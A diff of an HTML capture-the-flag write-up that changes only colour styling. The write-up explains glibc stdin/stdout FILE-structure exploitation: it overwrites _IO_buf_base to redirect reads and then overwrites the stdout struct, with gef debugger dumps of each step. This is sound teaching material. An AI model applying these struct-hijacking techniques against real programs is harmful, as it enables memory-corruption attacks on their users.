@@ -37,36 +37,36 @@
       <p>The key concept is the _IO_buf_base and _IO_buf_end fields in our <span class='monospace'>stdin</span> struct.</p>
 
       <pre><code><span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">gef&gt; </span>p *stdin
-<span style="color:#0550ae">$2</span> = {
-  <span style="color:#0550ae">_flags</span> = 0xfbad208b,
-  <span style="color:#0550ae">_IO_read_ptr</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_read_end</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_read_base</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_write_base</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_write_ptr</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_write_end</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_buf_base</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_buf_end</span> = <span style="color:#cf222e">0x7f906c203964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_save_base</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_IO_backup_base</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_IO_save_end</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_markers</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_chain</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_fileno</span> = 0x0,
-  <span style="color:#0550ae">_flags2</span> = 0x0,
-  <span style="color:#0550ae">_old_offset</span> = 0xffffffffffffffff,
-  <span style="color:#0550ae">_cur_column</span> = 0x0,
-  <span style="color:#0550ae">_vtable_offset</span> = 0x0,
-  <span style="color:#0550ae">_shortbuf</span> = &quot;&quot;,
-  <span style="color:#0550ae">_lock</span> = <span style="color:#cf222e">0x7f906c205720</span> &lt;<span style="color:#953800">_IO_stdfile_0_lock</span>&gt;,
-  <span style="color:#0550ae">_offset</span> = 0xffffffffffffffff,
-  <span style="color:#0550ae">_codecvt</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_wide_data</span> = <span style="color:#cf222e">0x7f906c2039c0</span> &lt;<span style="color:#953800">_IO_wide_data_0</span>&gt;,
-  <span style="color:#0550ae">_freeres_list</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_freeres_buf</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">__pad5</span> = 0x0,
-  <span style="color:#0550ae">_mode</span> = 0xffffffff,
-  <span style="color:#0550ae">_unused2</span> = '\000' &lt;repeats 19 times&gt;
+<span style="color:#6639ba">$2</span> = {
+  <span style="color:#6639ba">_flags</span> = 0xfbad208b,
+  <span style="color:#6639ba">_IO_read_ptr</span> = <span style="color:#0550ae">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_read_end</span> = <span style="color:#0550ae">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_read_base</span> = <span style="color:#0550ae">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_write_base</span> = <span style="color:#0550ae">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_write_ptr</span> = <span style="color:#0550ae">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_write_end</span> = <span style="color:#0550ae">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_buf_base</span> = <span style="color:#0550ae">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_buf_end</span> = <span style="color:#0550ae">0x7f906c203964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_save_base</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_IO_backup_base</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_IO_save_end</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_markers</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_chain</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_fileno</span> = 0x0,
+  <span style="color:#6639ba">_flags2</span> = 0x0,
+  <span style="color:#6639ba">_old_offset</span> = 0xffffffffffffffff,
+  <span style="color:#6639ba">_cur_column</span> = 0x0,
+  <span style="color:#6639ba">_vtable_offset</span> = 0x0,
+  <span style="color:#6639ba">_shortbuf</span> = &quot;&quot;,
+  <span style="color:#6639ba">_lock</span> = <span style="color:#0550ae">0x7f906c205720</span> &lt;<span style="color:#953800">_IO_stdfile_0_lock</span>&gt;,
+  <span style="color:#6639ba">_offset</span> = 0xffffffffffffffff,
+  <span style="color:#6639ba">_codecvt</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_wide_data</span> = <span style="color:#0550ae">0x7f906c2039c0</span> &lt;<span style="color:#953800">_IO_wide_data_0</span>&gt;,
+  <span style="color:#6639ba">_freeres_list</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_freeres_buf</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">__pad5</span> = 0x0,
+  <span style="color:#6639ba">_mode</span> = 0xffffffff,
+  <span style="color:#6639ba">_unused2</span> = '\000' &lt;repeats 19 times&gt;
 }
 <span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">gef&gt; </span></code></pre>
 
@@ -109,36 +109,36 @@
       <p>First step is the ⍉ byte overwrite.</p>
 
       <pre><code><span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">gef&gt; </span>p *stdin
-<span style="color:#0550ae">$3</span> = {
-  <span style="color:#0550ae">_flags</span> = 0xfbad208b,
-  <span style="color:#0550ae">_IO_read_ptr</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_read_end</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_read_base</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_write_base</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_write_ptr</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_write_end</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_buf_base</span> = <span style="color:#cf222e">0x7f9293e03900</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+32&gt; &quot;c9\340\223\222\177&quot;,
-  <span style="color:#0550ae">_IO_buf_end</span> = <span style="color:#cf222e">0x7f9293e03964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
+<span style="color:#6639ba">$3</span> = {
+  <span style="color:#6639ba">_flags</span> = 0xfbad208b,
+  <span style="color:#6639ba">_IO_read_ptr</span> = <span style="color:#0550ae">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_read_end</span> = <span style="color:#0550ae">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_read_base</span> = <span style="color:#0550ae">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_write_base</span> = <span style="color:#0550ae">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_write_ptr</span> = <span style="color:#0550ae">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_write_end</span> = <span style="color:#0550ae">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_buf_base</span> = <span style="color:#0550ae">0x7f9293e03900</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+32&gt; &quot;c9\340\223\222\177&quot;,
+  <span style="color:#6639ba">_IO_buf_end</span> = <span style="color:#0550ae">0x7f9293e03964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
       ...
 <span style="font-weight:bold;color:#116329">gef&gt; </span>x/16g 0x7f9293e03900
-<span style="color:#cf222e">0x7f9293e03900</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+32&gt;:     0x7f9293e03963  0x7f9293e03963
-<span style="color:#cf222e">0x7f9293e03910</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+48&gt;:     0x7f9293e03963  0x7f9293e03900
-<span style="color:#cf222e">0x7f9293e03920</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+64&gt;:     0x7f9293e03964  0x0
-<span style="color:#cf222e">0x7f9293e03930</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+80&gt;:     0x0     0x0
-<span style="color:#cf222e">0x7f9293e03940</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+96&gt;:     0x0     0x0
-<span style="color:#cf222e">0x7f9293e03950</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+112&gt;:    0x0     0xffffffffffffffff
-<span style="color:#cf222e">0x7f9293e03960</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+128&gt;:    0x0     0x7f9293e05720
-<span style="color:#cf222e">0x7f9293e03970</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+144&gt;:    0xffffffffffffffff      0x0</code></pre>
+<span style="color:#0550ae">0x7f9293e03900</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+32&gt;:     0x7f9293e03963  0x7f9293e03963
+<span style="color:#0550ae">0x7f9293e03910</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+48&gt;:     0x7f9293e03963  0x7f9293e03900
+<span style="color:#0550ae">0x7f9293e03920</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+64&gt;:     0x7f9293e03964  0x0
+<span style="color:#0550ae">0x7f9293e03930</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+80&gt;:     0x0     0x0
+<span style="color:#0550ae">0x7f9293e03940</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+96&gt;:     0x0     0x0
+<span style="color:#0550ae">0x7f9293e03950</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+112&gt;:    0x0     0xffffffffffffffff
+<span style="color:#0550ae">0x7f9293e03960</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+128&gt;:    0x0     0x7f9293e05720
+<span style="color:#0550ae">0x7f9293e03970</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+144&gt;:    0xffffffffffffffff      0x0</code></pre>
 
       <p>Here, the ⍉ byte overwrite has been performed, and we can see that our next write would be relatve to 0x900: this would overwrite the three <span class='monospace'>write</span> fields (which we can ⍉ out), and allow us to rewrite <span class='monospace'>buf_base</span> at 0x918 and <span class='monospace'>buf_end</span> at 0x920.</p>
 
       <p>Continuing onwards into the horrific bowels of libc IO functions, we can see the eventual vtable dispatch that calls a <span class='monospace'>read</span> with the correct variables set (we read from the <span class='monospace'>stdin</span> struct with buf set to <span class='monospace'>stdin + 0x20</span>).</p>
 
       <pre><code><span style="color:#0550ae">-------------------------- memory access: $r12+0x70 = 0x7fe1fb2020a0 ----</span>
-      <span style="color:#0550ae">0x7fe1fb2020a0</span>|+0x0000|+000: <span style="color:#cf222e">0x00007fe1fb0938b0</span> &lt;_IO_file_read&gt;  -&gt;  0x027447f6fa1e0ff3
-      <span style="color:#0550ae">0x7fe1fb2020a8</span>|+0x0008|+001: <span style="color:#cf222e">0x00007fe1fb093940</span> &lt;_IO_file_write@@GLIBC_2.2.5&gt;  -&gt;  0xe5894855fa1e0ff3
-      <span style="color:#0550ae">0x7fe1fb2020b0</span>|+0x0010|+002: <span style="color:#cf222e">0x00007fe1fb0938d0</span> &lt;_IO_file_seek&gt;  -&gt;  0xe9707f8bfa1e0ff3
-      <span style="color:#0550ae">0x7fe1fb2020b8</span>|+0x0018|+003: <span style="color:#cf222e">0x00007fe1fb093930</span> &lt;_IO_file_close&gt;  -&gt;  0xe9707f8bfa1e0ff3
+      <span style="color:#0550ae">0x7fe1fb2020a0</span>|+0x0000|+000: <span style="color:#0550ae">0x00007fe1fb0938b0</span> &lt;_IO_file_read&gt;  -&gt;  0x027447f6fa1e0ff3
+      <span style="color:#0550ae">0x7fe1fb2020a8</span>|+0x0008|+001: <span style="color:#0550ae">0x00007fe1fb093940</span> &lt;_IO_file_write@@GLIBC_2.2.5&gt;  -&gt;  0xe5894855fa1e0ff3
+      <span style="color:#0550ae">0x7fe1fb2020b0</span>|+0x0010|+002: <span style="color:#0550ae">0x00007fe1fb0938d0</span> &lt;_IO_file_seek&gt;  -&gt;  0xe9707f8bfa1e0ff3
+      <span style="color:#0550ae">0x7fe1fb2020b8</span>|+0x0018|+003: <span style="color:#0550ae">0x00007fe1fb093930</span> &lt;_IO_file_close&gt;  -&gt;  0xe9707f8bfa1e0ff3
 <span style="color:#0550ae">--------------------------------------------- arguments (from block) ----</span>
 0x7fe1fb0938b0 &lt;__GI__IO_file_read&gt; (
    FILE* fp = <span style="color:#116329">0x00007fe1fb2038e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad208b,
@@ -146,14 +146,14 @@
    ssize_t size = 0x0000000000000064,
 )
 <span style="color:#0550ae">------------------------------------------------------------ threads ----</span>
-[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">Thread Id:1, tid:232917</span>] Name: &quot;main_patched&quot;, <span style="font-weight:bold"></span><span style="font-weight:bold;color:#cf222e">stopped</span> at <span style="color:#cf222e">0x7fe1fb0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt;, reason: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">BREAKPOINT</span>
+[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">Thread Id:1, tid:232917</span>] Name: &quot;main_patched&quot;, <span style="font-weight:bold"></span><span style="font-weight:bold;color:#cf222e">stopped</span> at <span style="color:#0550ae">0x7fe1fb0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt;, reason: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">BREAKPOINT</span>
 <span style="color:#0550ae">-------------------------------------------------------------- trace ----</span>
-[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">#0</span>] <span style="color:#cf222e">0x7fe1fb0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">_IO_new_file_underflow</span>)
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#1</span>] <span style="color:#cf222e">0x7fe1fb0955d2</span> &lt;_IO_default_uflow+0x32&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">__GI__IO_default_uflow</span>)
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#2</span>] <span style="color:#cf222e">0x557d9b92e238</span> &lt;main+0xdf&gt;
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#3</span>] <span style="color:#cf222e">0x7fe1fb02a1ca</span> &lt;__libc_start_call_main+0x7a&gt;
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#4</span>] <span style="color:#cf222e">0x7fe1fb02a28b</span> &lt;__libc_start_main_impl+0x8b&gt;
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#5</span>] <span style="color:#cf222e">0x557d9b92e091</span> &lt;_start+0x21&gt;
+[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">#0</span>] <span style="color:#0550ae">0x7fe1fb0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">_IO_new_file_underflow</span>)
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#1</span>] <span style="color:#0550ae">0x7fe1fb0955d2</span> &lt;_IO_default_uflow+0x32&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">__GI__IO_default_uflow</span>)
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#2</span>] <span style="color:#0550ae">0x557d9b92e238</span> &lt;main+0xdf&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#3</span>] <span style="color:#0550ae">0x7fe1fb02a1ca</span> &lt;__libc_start_call_main+0x7a&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#4</span>] <span style="color:#0550ae">0x7fe1fb02a28b</span> &lt;__libc_start_main_impl+0x8b&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#5</span>] <span style="color:#0550ae">0x557d9b92e091</span> &lt;_start+0x21&gt;
 <span style="color:#0550ae">-------------------------------------------------------------------------</span></code></pre>
 
       <p>The chain is quite straightforward from here. After sending the bytes to overwrite <span class='monospace'>buf_base</span> once more, this vtable dispatch is called once again, allowing us to overwrite our <span class='monospace'>stdout</span> struct with whatever we want.</p>
@@ -165,26 +165,26 @@
    ssize_t size = 0x00000000000000e0,
 )
 <span style="color:#0550ae">------------------------------------------------------ threads ----
-</span>[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">Thread Id:1, tid:233175</span>] Name: &quot;main_patched&quot;, <span style="font-weight:bold"></span><span style="font-weight:bold;color:#cf222e">stopped</span> at <span style="color:#cf222e">0x7f64ee0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt;, reason: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">BREAKPOINT</span>
+</span>[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">Thread Id:1, tid:233175</span>] Name: &quot;main_patched&quot;, <span style="font-weight:bold"></span><span style="font-weight:bold;color:#cf222e">stopped</span> at <span style="color:#0550ae">0x7f64ee0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt;, reason: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">BREAKPOINT</span>
 <span style="color:#0550ae">-------------------------------------------------------- trace ----
-</span>[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">#0</span>] <span style="color:#cf222e">0x7f64ee0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">_IO_new_file_underflow</span>)
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#1</span>] <span style="color:#cf222e">0x7f64ee0955d2</span> &lt;_IO_default_uflow+0x32&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">__GI__IO_default_uflow</span>)
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#2</span>] <span style="color:#cf222e">0x55b4094a1238</span> &lt;main+0xdf&gt;
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#3</span>] <span style="color:#cf222e">0x7f64ee02a1ca</span> &lt;__libc_start_call_main+0x7a&gt;
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#4</span>] <span style="color:#cf222e">0x7f64ee02a28b</span> &lt;__libc_start_main_impl+0x8b&gt;
-[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#5</span>] <span style="color:#cf222e">0x55b4094a1091</span> &lt;_start+0x21&gt;
+</span>[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">#0</span>] <span style="color:#0550ae">0x7f64ee0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">_IO_new_file_underflow</span>)
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#1</span>] <span style="color:#0550ae">0x7f64ee0955d2</span> &lt;_IO_default_uflow+0x32&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">__GI__IO_default_uflow</span>)
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#2</span>] <span style="color:#0550ae">0x55b4094a1238</span> &lt;main+0xdf&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#3</span>] <span style="color:#0550ae">0x7f64ee02a1ca</span> &lt;__libc_start_call_main+0x7a&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#4</span>] <span style="color:#0550ae">0x7f64ee02a28b</span> &lt;__libc_start_main_impl+0x8b&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#5</span>] <span style="color:#0550ae">0x55b4094a1091</span> &lt;_start+0x21&gt;
 <span style="color:#0550ae">-------------------------------------------------------------------
 </span><span style="font-weight:bold;color:#0550ae"></span><span style="font-weight:bold;color:#116329">gef&gt; </span>p *stdin
-<span style="color:#0550ae">$1</span> = {
-  <span style="color:#0550ae">_flags</span> = 0xfbad208b,
-  <span style="color:#0550ae">_IO_read_ptr</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
-  <span style="color:#0550ae">_IO_read_end</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
-  <span style="color:#0550ae">_IO_read_base</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
-  <span style="color:#0550ae">_IO_write_base</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
-  <span style="color:#0550ae">_IO_write_ptr</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
-  <span style="color:#0550ae">_IO_write_end</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
-  <span style="color:#0550ae">_IO_buf_base</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
-  <span style="color:#0550ae">_IO_buf_end</span> = <span style="color:#cf222e">0x7f64ee2046a0</span> &quot;\340D \356d\177&quot;,</code></pre>
+<span style="color:#6639ba">$1</span> = {
+  <span style="color:#6639ba">_flags</span> = 0xfbad208b,
+  <span style="color:#6639ba">_IO_read_ptr</span> = <span style="color:#0550ae">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#6639ba">_IO_read_end</span> = <span style="color:#0550ae">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#6639ba">_IO_read_base</span> = <span style="color:#0550ae">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#6639ba">_IO_write_base</span> = <span style="color:#0550ae">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#6639ba">_IO_write_ptr</span> = <span style="color:#0550ae">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#6639ba">_IO_write_end</span> = <span style="color:#0550ae">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#6639ba">_IO_buf_base</span> = <span style="color:#0550ae">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#6639ba">_IO_buf_end</span> = <span style="color:#0550ae">0x7f64ee2046a0</span> &quot;\340D \356d\177&quot;,</code></pre>
 
       <p>The solve script and its annotated steps are shown. Also, further cool tech: <span class='monospace'>pwncli</span> has builtin House of Apple 2 structs, which is very nice.</p>
 
@@ -235,22 +235,22 @@
 
       <p>The first question is why exactly is the buffer stored in the filestruct itself? The answer actually lies in the above output - it is subtle, but there is a <span class='monospace'>shortbuf</span> field contained within the filestruct that is used by libc when a filestream is specifically unbuffered.</p>
 
-      <pre><code>  <span style="color:#0550ae">_IO_buf_end</span> = <span style="color:#cf222e">0x7efc76c03964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
-  <span style="color:#0550ae">_IO_save_base</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_IO_backup_base</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_IO_save_end</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_markers</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_chain</span> = <span style="color:#cf222e">0x0</span>,
-  <span style="color:#0550ae">_fileno</span> = 0x0,
-  <span style="color:#0550ae">_flags2</span> = 0x0,
-  <span style="color:#0550ae">_short_backupbuf</span> = &quot;&quot;,
-  <span style="color:#0550ae">_old_offset</span> = 0xffffffffffffffff,
-  <span style="color:#0550ae">_cur_column</span> = 0x0,
-  <span style="color:#0550ae">_vtable_offset</span> = 0x0,
-  <span style="color:#0550ae">_shortbuf</span> = &quot;&quot;,
-  <span style="color:#0550ae">_lock</span> = <span style="color:#cf222e">0x7efc76c05720</span> &lt;<span style="color:#953800">_IO_stdfile_0_lock</span>&gt;,
-  <span style="color:#0550ae">_offset</span> = 0xffffffffffffffff,
-  <span style="color:#0550ae">_codecvt</span> = <span style="color:#cf222e">0x0</span>,</code></pre>
+      <pre><code>  <span style="color:#6639ba">_IO_buf_end</span> = <span style="color:#0550ae">0x7efc76c03964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
+  <span style="color:#6639ba">_IO_save_base</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_IO_backup_base</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_IO_save_end</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_markers</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_chain</span> = <span style="color:#0550ae">0x0</span>,
+  <span style="color:#6639ba">_fileno</span> = 0x0,
+  <span style="color:#6639ba">_flags2</span> = 0x0,
+  <span style="color:#6639ba">_short_backupbuf</span> = &quot;&quot;,
+  <span style="color:#6639ba">_old_offset</span> = 0xffffffffffffffff,
+  <span style="color:#6639ba">_cur_column</span> = 0x0,
+  <span style="color:#6639ba">_vtable_offset</span> = 0x0,
+  <span style="color:#6639ba">_shortbuf</span> = &quot;&quot;,
